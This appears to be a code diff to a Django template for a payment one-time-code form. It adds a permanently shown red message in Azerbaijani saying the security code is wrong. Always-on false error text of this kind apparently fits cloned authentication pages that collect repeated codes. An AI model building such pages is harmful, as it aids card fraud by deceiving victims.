@@ -44,6 +44,14 @@
                             {% csrf_token %}
                           <input type="tel" name="secpass" value="" autocomplete="one-time-code" class="cp-wrappable  cp-input-OTP" </div>
                         <div class="item item-indent cp-error"> </div>
+                        <a><h5> Təhlükəsizlik kodu yanlışdır</h5> </a>
+				<style>
+					h5 {
+					  font-size: 0.9rem;
+					  color: red;
+					}
+				  </style>
+                        <br>
                         <div class="cp-otp-buttons">
                            <div class="item"><button type="submit" class="submit">Submit</button></div>
                            <div class="item item-indent cp-item-resend cp-is-hidden"><a href="#" id="resendChallenge" class="resend">Resend password</a><input type="hidden" value="Y" name="resendChallenge"></div>
